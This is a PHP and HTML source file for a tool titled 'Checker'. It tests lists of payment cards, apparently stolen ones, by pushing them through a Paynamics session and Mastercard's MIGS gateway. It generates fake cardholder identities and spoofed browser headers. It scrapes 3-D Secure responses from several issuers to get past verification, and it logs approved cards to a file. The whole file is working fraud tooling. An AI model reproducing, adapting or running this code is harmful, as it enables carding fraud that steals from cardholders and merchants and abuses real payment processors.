<?php
error_reporting(E_ERROR | E_PARSE);
!is_dir('C:\xampp\c') ? shell_exec('mkdir C:\xampp\c') : NULL;
$cookie = random(10);

$_SESSION['bG'] = [
  'useragent' => 'Mozilla/5.0 (Windows NT 6.1; '.random(6).') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.'.mt_rand(100,9999).'.154 Safari/'.mt_rand(100,999).'.36 OPR/20.0.'.mt_rand(100,999).'.91',
];
extract(($i_ = [
  'n' => random(5),
  'l' => random(5),
  'e' => random(8).'@gmail.com',
  'st' => random(8).' '.mt_rand(),
  'ct' => random(5),
  'phn' => '202'.mt_rand(1000000,9999999)
]));

extract($_GET);
if(($I = json_decode($data))->session) {
  
  extract(set_card($card, 4)); 
  $type = $cc[0] == 4 ? 'visa' : ($cc[0] == '5' ? 'mastercard' : d('error', '[Card Type]'));
  $tries = 0;
  $C = json_decode(
    rq('https://nodecde1.paynamics.net/possible/transaction/cc/fetch/ui/config/data1='.$I->data1.'&data2='.$t)
  );
  
  $x  = random(10).'.txt';
  fwrite(fopen($x, 'a'), "var RS = require('./rsa.js')
  var RSAEncrypt = new RS.JSEncrypt();
  var pub = '".str_replace("\n", '', trim($C->pub))."'
  RSAEncrypt.setPublicKey(pub);
  var a = {
    card_number: '$cc',
    exp_month: '$mm',
    exp_year: '$yyyy',
    card_holder: '$n $l',
    card_type: '$type'
  };
  var encryptCardNo = RSAEncrypt.encrypt(JSON.stringify(a));
  console.log(encryptCardNo)");
  $e_cc = trim(shell_exec('node '.$x)); 
  unlink($x);

  $trnx = json_decode(rq('https://nodecde1.paynamics.net/possible/transaction/wf/cc/transact_cvv_off/token?data1='.$I->data1.'&data2='.$t, [
    'postfields' => '{"agreement":true,"session":"'.$I->session.'","moment":"'.$I->moment.'","encData":"'.$e_cc.'"}',
    'httpheader' => [
      'accept: application/json',
      'content-type: application/json',
      'origin: https://shield.paynamics.net',
      'x-request-id: '.$C->trxData->request_id
    ]
  ]), 1);
  
  if($trnx['vpc_CardNum'] && $trnx['vpc_Amount']) {
    unset($trnx['action']); unset($trnx['processor']);
    extract($trnx);
  } else {
    d('error', '[transaction] Session Expired');
  }
  $mgs = rq('https://migs.mastercard.com.au/vpcpay', [
    'header' => 1,
    'followlocation' => 1,
    'postfields' => "vpc_AccessCode=$vpc_AccessCode&vpc_Amount=$vpc_Amount&vpc_CardExp=$vpc_CardExp&vpc_CardNum=$vpc_CardNum&vpc_CardSecurityCode=$vpc_CardSecurityCode&vpc_Command=pay&vpc_Gateway=ssl&vpc_MerchTxnRef=$vpc_MerchTxnRef&vpc_Merchant=$vpc_Merchant&vpc_OrderInfo=$vpc_OrderInfo&vpc_ReturnURL=".urlencode($vpc_ReturnURL)."&vpc_Version=1&vpc_card=$vpc_card&vpc_SecureHash=$vpc_SecureHash&vpc_SecureHashType=SHA256&vpc_Currency=PHP",
    'httpheader' => [
      'Host: migs.mastercard.com.au',
      'Connection: keep-alive',
      'Cache-Control: max-age=0',
      'Upgrade-Insecure-Requests: 1',
      'Content-Type: application/x-www-form-urlencoded',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    ]
  ],1);
  $pId = g($mgs, 'paymentId=',"\r\n");
  if(g($mgs, '&vpc_Message=','&')) {
    g($mgs, '&vpc_Message=','&') == 'Approved' ? d('live', '[3dsPass] Approved') : d('dead', '[3dsN] '.g($mgs, 'vpc_Message=','&'));
  }
  $act = g($mgs, 'action="','"');
  $p = build(g($mgs, $act, '<table'), '<input');
  $ds = str_replace(["\t", ' ', "\n"], '', rq($act, 
  [
    'postfields' => http_build_query($p),
    'httpheader' => [
      'Origin: https://migs.mastercard.com.au',
      'Content-Type: application/x-www-form-urlencoded',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Accept-Language: en-US,en;q=0.9'
    ]
  ],4)); 
  
  if(g($ds, 'name="PaRes"value="','"')) {
    $PP = build(g($ds, $pId,'</form>'), '<input');
    if((!substr_count ($ds, 'PaReq') ? (
      $ps = rq($p['TermUrl'], [
        'header' => 1,
        'followlocation' => 1,
        'postfields' => http_build_query($PP),
        'httpheader' => [
          'Content-Type: application/x-www-form-urlencoded'
        ]
      ],1)
    ) : NULL) === NULL) {
      $ps = rq($p['TermUrl'], [
        'header' => 1,
        'followlocation' => 1,
        'postfields' => http_build_query($PP),
        'httpheader' => [
          'Content-Type: application/x-www-form-urlencoded'
        ]
      ],1); 
    }
  } else {
    if(substr_count($act, 'www.securesuite.co.uk')) {
      $pares = secu($ds); 
    } else if(substr_count($act, 'authentication.cardinalcommerce.com')) {
      $pares = comm($ds);
    } elseif(substr_count($act, 'acsweb-pa.dnp-cdms.jp')) {
      $ID = g($ds, 'name="id"value="','"');
      $pares = g(rq('https://acsweb-pa.dnp-cdms.jp/auth/yub0/pa/V/attempt_receive_PC',
      [
        'postfields' => "id=".urlencode($ID),
        'httpheader' => [
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'Content-Type: application/x-www-form-urlencoded',
          'Host: acsweb-pa.dnp-cdms.jp',
          'Origin: https://acsweb-pa.dnp-cdms.jp'
        ]
      ],4), 'name="PaRes" value="','"');
    } else {
      d('dead', '3ds not supported');
    }
    $ps = rq($p['TermUrl'], [
      'header' => 1,
      'followlocation' => 1,
      'postfields' => http_build_query([
        'PaRes' => $pares,
        'MD' => $p['MD']
      ]),
      'httpheader' => [
        'Content-Type: application/x-www-form-urlencoded'
      ]
    ],1);
  }
  $R = g($ps, 'ocation: ',"\r\n");
  $e = explode('&', $R);
  foreach($e as $l) {
    $res[g($l, 'vpc_','=')] = g($l, '=','angpagkabinatamoaymapapalsipika');
  }
  if($res['Message'] == 'Approved') {
    fwrite(fopen('merci.txt', 'a'), $cc.'|'.$mm.'|'.$yyyy."\r\n");
    d('live', '['.preg_replace('/00/', '', $res['Amount'], 1).'] <a href="'.$R.'" target="_blank">Flex</a> CustomerName: ['.$C->trxData->payload->customer_info->fname.'] ['.$C->trxData->payload->customer_info->lname.']');
  } else {
    d('dead', '['.str_replace('+', ' ', $res['Message']).']');
  }
}
function comm($opt) {
  $trId = g($opt, 'name="TransactionId"type="hidden"value="','"');
  $sId = g($opt, 'name="IssuerId"type="hidden"value="','"');

  rq('https://authentication.cardinalcommerce.com/Api/NextStep/ProcessRisk',
    [
      'postfields' => "TransactionId=$trId&DeviceId=$trId&ProviderType=TM&ProviderId=01zzvc40&IssuerId=$sId&X-Requested-With=XMLHttpRequest&X-HTTP-Method-Override=FORM",
      'httpheader' => [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://authentication.cardinalcommerce.com',
        'x-http-method-override: FORM',
        'x-requested-with: XMLHttpRequest'
      ]
    ], 4
  ); 

  $term = rq('https://authentication.cardinalcommerce.com/api/nextstep/term',
    [
      'postfields' => "TransactionId=$trId&IssuerId=".$sId,
      'httpheader' => [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://authentication.cardinalcommerce.com',
        'x-requested-with: XMLHttpRequest'
      ]
    ]
  );
  return g($term, '"PARes":"','"');
}
function g($s, $t, $r) {
  return explode($r, explode($t, $s)[1])[0];
}
function secu ($opt) {
  $cyP = g($opt, 'name='."'".'cy_param_0'."'".'value="', '"');
  $I = rq('https://www.securesuite.co.uk/cba/tdsecure/intro.jsp',
    [
      'postfields' => "page_timeout_flag=false&c_flash=&a_data=pm_fpua%253Dmozilla%252F5.0%2520%28windows%2520nt%252010.0%253B%2520win64%253B%2520x64%29%2520applewebkit%252F537.36%2520%28khtml%252C%2520like%2520gecko%29%2520chrome%252F100.0.4896.79%2520safari%252F537.36%257C5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F100.0.4896.79%2520Safari%252F537.36%257CWin32%255E%7E%255Epm_fpsc%253D24%257C1920%257C1080%257C1040%255E%7E%255Epm_fpsw%253D%255E%7E%255Epm_fptz%253D8%255E%7E%255Elang%253Den-US%255E%7E%255Esyslang%253D%255E%7E%255Euserlang%253D%255E%7E%255Epm_fpjv%253Dfalse%255E%7E%255Epm_fpco%253Dtrue%255E%7E%255Epm_fpasw%253Dxyswrvqvqvkfchqiecbgw48epnz58epn%257Cevxlly58ev379%257Csjechwyswlly5co%257Cohdhqieix48ephjx%255E%7E%255Epm_fpan%253DNetscape%255E%7E%255Epm_fpacn%253DMozilla%255E%7E%255Epm_fpol%253Dtrue%255E%7E%255Epm_fposp%253D%255E%7E%255Epm_fpup%253D%255E%7E%255Epm_fpsaw%253D1920%255E%7E%255Epm_fpspd%253D24%255E%7E%255Epm_fpsbd%253D%255E%7E%255Epm_fpsdx%253D%255E%7E%255Epm_fpsdy%253D%255E%7E%255Epm_fpslx%253D%255E%7E%255Epm_fpsly%253D%255E%7E%255Epm_fpsfse%253D%255E%7E%255Epm_fpsui%253D&NF=noflash&FV=noflash&ERROR2=noflash&html5_data=H.84046676.9190569434&user_action=dummy&cy_param_0=".$cyP,
      'httpheader' => [
        'Host: www.securesuite.co.uk',
        'Origin: https://migs.mastercard.com.au',
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language: en-US,en;q=0.9'
      ]
      ], 4
  );
  if(substr_count($I, 'mobile:****')) {
    d('dead', '[OTP] Payment');
  }
  return g($I, 'name="PaRes"	value="','"');
}
function rq($u, $p = [], $t = 0) {
  global $cookie;
  if(!$p) $p[l('customrequest')] = 'GET';
  else foreach($p as $n => $s) { $p[l($n)] = $s; unset($p[$n]);}
  $p[l('returntransfer')] = 1;
  foreach($_SESSION['bG'] as $E => $N) {
    $p[l($E)] = $N;
  }
  $c = 'C:\xampp\c/'.$t.'_'.$cookie.'.txt';
  $p[10031] = $c;
  $p[10082] = $c;
  curl_setopt_array(($c = curl_init($u)), $p);
  $e = curl_exec($c);
  return $e;
}
function l ($a) {
  return eval('return CURLOPT_'.strtoupper($a).';');
}
function random($l){
  $ch = implode('', range('a', 'z')).implode('', range('A', 'Z'));
  $chs = strlen($ch);
  $str = '';
  for($i=0; $i <= $l; $i++){
    $str .= $ch[mt_rand(0, $chs)];
  }
  return $str;
}
function build ($f, $e, $s = '"') {
  foreach(explode($e, $f) as $o) {
    $dd[g($o, "name=$s", $s)] = g($o, "value=$s",$s);
  }
  unset($dd['']);
  unset($dd['submit']);
  return $dd;
}
function rmf() {
  foreach(glob('C:\xampp\c/*.txt') as $int => $value) {
    if(is_file($value)) {
      unlink($value);
    }
  }
}
function set_card($card, $validYYYY = 2) {
  list($cc,$mm,$yyyy,$cvv) = explode('|',$card);
  $yyyy = strlen($yyyy) === 4 ? ($validYYYY === 2 ? substr($yyyy, 2) : $yyyy) : (strlen($yyyy) === 2 ? ($validYYYY === 4 ?  '20'.$yyyy : $yyyy) : exit('INVALID EXP YEAR'));
  return [
    'cc' => $cc,
    'mm' => $mm,
    'yyyy' => $yyyy,
    'cvv' => $cvv
  ];
}
function Receipt($link) {
  !is_dir('receipt') ? shell_exec('mkdir receipt') : NULL;
  $T = $_SESSION['data']['receipt'] = getcwd().'/receipt/'.random(10).'_FLEX';
  file_put_contents($T, $link);
}
function d($d, $r) {
  rmf();
  echo json_encode([
    'cards' => '<div id="rslt" class="rslt '.$d.'">'.$_GET['card'].'<hr></div>',
    'result' => '<div id="rslt" class="rslt '.$d.'">'.$r.'<hr></div>'
  ]);
  exit;
}
?>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">
  <title>Checker</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      color: #fff;
      background-color: black;
      margin: 0;
      font-family: 'Nanum Gothic', sans-serif;
    }
    .main {
      max-width: 80%;
      width: 80%;
      padding: 10px;
      margin: 0 auto;
    }
    .card > textarea {
      text-align: center;
      color: #fff;
      background: black;
      border-radius: 10px;
      width: 100%;
      height: 135px;
    }
    hr {
      border: 0.1% solid white;
      opacity: 0.3;
    }
    header h1 {
      text-align: center;
    }
    .status {
      margin-top: 10px;
      display: flex;
      justify-content: space-between;
    }
    .tkn {
      margin-right: 10px;
      height: 120px;
      width: 40%;
      border: 1px solid white;
      border-radius: 10px;
    }
    .sts {
      margin-left: 10px;
      height: 120px;
      width: 40%;
      font-size: 15px;
      border: 1px solid white;
      border-radius: 10px;
    }
    .main > p {
      text-align: center;
    }
    .decision {
      width: 40%;
    }
    .display {
      display: flex;
      align-items: flex-start;
      max-width: 100%;
      width: 80%;
      padding: 10px;
      margin: 0 auto;
      margin-top: 10px;
    }
    .decision > button {
      width: 100%;
      height: 50px;
      background: black;
    }
    .btn-1 {
      border-radius: 8px;
      font-size: 1.5rem;
      color: rgb(0, 128, 0);
    }
    .btn-1, .btn-2 {
      transition: all ease 0.2s;
    }
    .btn-2 {
      border-radius: 8px;
      margin-top: 20px;
      font-size: 1.5rem;
      color: rgb(255, 0, 0);
    }
    button:hover {
      box-shadow: inset 500px 0 0 0 #F5FFFA;
    }
    .column {
      margin: 10px;
    }
    .sLive, .sDead, .sTotal {
      border-radius: 7px;
      text-align: center;
    }
    .sLive {
      border: 1px solid #006400;
    }
    .sDead {
      border: 1px solid #8B0000;
    }
    .tkn > textarea {
      width: 60%;
      height: 40px;
      margin-left: 20%;
    }
    textarea {
      color: #fff;
      border-radius: 10px;
      background: black;
      text-align: center;
    }
    .c-cards, .c-response, .c-dbg {
      font-size: 15px;
      opacity: 0.7;
      transition: 0.3s;
      height: 50px;
    }
    .live-r > .c-cards, .live-r > .c-response {
      border: 1px solid #006400;
    }
    .c-dbg:hover, .c-cards:hover, .c-response:hover {
      opacity: 1;
      border-bottom: 1px solid #fff;
    }
    p {
      text-align: center;
    }
    .live-r, .dead-r{
      display: flex;
      width: 100%;
    }
    .rght {
      margin-right: 10px;
    }
    .box {
      width: 50%;
    }
    .cl-live {
      width: 100%;
      border: 1px solid green;
      border-radius: 8px;
    }
    .cl-dead {
      margin-left: 10px;
      width: 100%;
      border: 1px solid darkred;
      border-radius: 8px;
    }
    .cl-dead, .cl-live {
      overflow: auto;
      max-height: 500px;
    }
    .cards-d {
      text-align: center;
    }
    .rslt {
      text-align: center;
      margin: 10px;
    }
    .dead {
      color: rgb(204, 8, 5);
    }
    .live {
      color: rgb(4, 156, 4)
    }
    ::-webkit-scrollbar {
        width: 6px;
    }
    ::-webkit-scrollbar-thumb {
      background: #fff;
      border-radius: 10px;
    }
    .live, .error, .dead {
      font-size: 15px;
    }
    .error {
      color: #FFFF00;
    }
    .select-a {
      color: #ADD8E6;
      width: 100%;
      height: 30px;
      margin: 0 auto;
      background: black;
      border-radius: 10px;
    }
    select option {
      text-align: center;
    }
    .session {
      margin-top: 10px;
      font-size: 15px;
    }
    .session > textarea {
      margin: 0;
      width: 100%;
    }
    .btn-1, .btn-2 {
      border: 1px solid white;
    }
  </style>
</head>
<body>
  <div class="main">
    <header>
      <h1>Converge</h1>
      <hr>
    </header>
    <p>Cards</p>
    <div class="card">
      <textarea id="cards" placeholder="xxxxxxxxxxxxxxxx"></textarea>
    </div>
    <div class="session">
      <textarea id="data" placeholder="Session Data FORMAT: JSON"></textarea>
    </div>
    <div class="status">
      <div class="tkn">
        <p>Time</p>
        <textarea id="date" placeholder="Date of Session Started"></textarea>
      </div>
      <div class="decision">
        <button onclick="start()" class="btn-1">Start</button>
        <button class="btn-2">Stop</button>
      </div>
      <div class="sts">
        <div class="column">
          <p class="sLive"><span id="c-live">0</span></p>
          <p class="sDead"><span id="c-dead">0</span></p>
          <p class="sTotal">Total: <span id="total">0</span></p>
        </div>
      </div>
    </div>
  </div>
  <div class="display">
    <div class="cl-live">
      <div class="live-r">
        <div id="c-cards" class="c-cards box">
          <p>Cards</p>
        </div>
        <div id="c-response" class="c-response box">
          <p>Response</p>
        </div>
      </div>
      <div id="card-live">
      </div>
      <div id="live-d">
      </div>
    </div>
    <div class="cl-dead">
      <div class="dead-r">
        <div id="c-cards" class="c-cards box">
          <p>Cards</p>
        </div>
        <div id="c-response" class="c-response box">
          <p>Response</p>
        </div>
        <div id="c-dbg" class="c-dbg box">
          <p >Error: <span id="c-error">0</span></p>
        </div>
      </div>
      <div id="card-dead">
      </div>
      <div id="dead-d">
      </div>
      <div id="dbg-d">
      </div>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.1.1/howler.min.js"></script>
  <script type="text/javascript">
    
    let scp = document.querySelector("#data");
    scp.value = localStorage.getItem("data")
    var cancel
    scp.addEventListener("keyup", event => {
      if(cancel) clearTimeout(cancel)
      setTimeout(()=>{
        localStorage.setItem("data", event.target.value)
      }, 1000)
    })
    let scps = document.querySelector("#date");
    scps.value = localStorage.getItem("time")
    var cancel
    scps.addEventListener("keyup", event => {
      if(cancel) clearTimeout(cancel)
      setTimeout(()=>{
        localStorage.setItem("time", event.target.value)
      }, 1000)
    })
    function rmtags(str) {
      if ((str===null) || (str==='')) return '';
      else str = str.toString();
      return str.replace( /(<([^>]+)>)/ig, '');
    }

    async function start () {
      var audio = new Audio('Take_the_consequences.mp3');
      var cards = $("#cards").val().split("\n")
      $(".sTotal").html("Total: <span id='total'>0</span>")
      let length = cards.length;
      var total = $('#total');
      total.html(length)
      window.time = $("#date").val()
      window.data = $("#data").val()
      for(const card of cards){
       await new Promise(function(r, rej) {
          $.ajax('?card=' + card + "&data=" + window.data + "&t=" + window.time, {
            type: 'GET',
            success: function ( data ) {
              if((data.match('rslt'))) {
                var getter = JSON.parse(data);
                if(getter.result.match('rslt live')) {
                  ACounter('live')
                  $("#live-d").prepend(getter.result)
                  $("#card-live").prepend(getter.cards)
                  audio.play()
                } else {
                  ACounter('dead')
                  $("#dead-d").prepend(getter.result)
                  $("#card-dead").prepend(getter.cards)
                }
              } else {
                ACounter('error')
                $("#dbg-d").prepend('<div id="rslt" class="rslt error">' + data + '<hr></div>')
                $("#card-dead").prepend('<div id="rslt" class="rslt error">'+ card + '<hr></div>')
              }
              r();
              CT()
            }
          })
        })
      };
      //$(".sTotal").html("<p>Checking is DONE!</p>")
    }
    function ACounter(sect){
      var c = $('#c-' + sect);
      c.html(parseInt(c.html())+1);
    }
    function CT () {
      var cards = $('#cards').val().split('\n');
      cards.splice(0, 1);
      $("#cards").val(cards.join("\n"));
    }
    $("#card-dead").hide();
    $("#card-live").hide();
    $("#dbg-d").hide();
    $(document).ready(function(){
      $(".dead-r > #c-cards").click(function() {
        $("#dead-d").hide();
        $("#dbg-d").hide();
        $("#card-dead").show();
        $(".dead-r > #c-response").css({"border-bottom": ""})
        $(".dead-r > #c-dbg").css({"border-bottom": ""})
        $(".dead-r > #c-cards").css({"border-bottom": "1px solid white"})
      })
      $(".dead-r > #c-response").click(function() {
        $("#card-dead").hide();
        $("#dbg-d").hide();
        $("#dead-d").show();
        $(".dead-r > #c-cards").css({"border-bottom": ""})
        $(".dead-r > #c-dbg").css({"border-bottom": ""})
        $(".dead-r > #c-response").css({"border-bottom": "1px solid white"})
      })
      $(".dead-r > #c-dbg").click(function() {
        $("#card-dead").hide();
        $("#dead-d").hide();
        $("#dbg-d").show();
        $(".dead-r > #c-response").css({"border-bottom": ""})
        $(".dead-r > #c-cards").css({"border-bottom": ""})
        $(".dead-r > #c-dbg").css({"border-bottom": "1px solid white"})
      })
      $(".live-r > #c-cards").click(function() {
        $("#live-d").hide();
        $("#card-live").show();
        $(".live-r > #c-response").css({"border-bottom": ""})
        $(".live-r > #c-cards").css({"border-bottom": "1px solid white"})
      })
      $(".live-r > #c-response").click(function() {
        $("#card-live").hide();
        $("#live-d").show();
        $(".live-r > #c-cards").css({"border-bottom": ""})
        $(".live-r > #c-response").css({"border-bottom": "1px solid white"})
      })
    });
  </script>
</body>
</html>